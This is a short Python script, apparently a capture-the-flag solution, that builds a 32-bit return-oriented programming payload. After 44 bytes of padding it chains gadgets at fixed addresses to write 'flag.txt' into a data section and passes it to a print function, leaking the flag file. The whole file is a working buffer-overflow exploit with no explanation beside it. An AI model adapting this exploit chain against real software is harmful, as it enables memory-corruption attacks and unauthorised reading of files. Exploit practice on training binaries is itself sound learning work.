import struct

printFunc = 0x80483d0
mov_edi_ebp = 0x08048543
data = 0x0804a018
pop2 = 0x080485aa

offset = 'A' * 44

payload = ''
payload += offset

payload += struct.pack("I", pop2) # pop edi; pop ebp; ret;
payload += struct.pack("I", data)
payload += 'flag'
payload += struct.pack("I", mov_edi_ebp)

payload += struct.pack("I", pop2)
payload += struct.pack("I", data+4)
payload += '.txt'
payload += struct.pack("I", mov_edi_ebp)

payload += struct.pack("I", printFunc)
payload += struct.pack("I", 0x0)
payload += struct.pack("I", data)

print(payload)
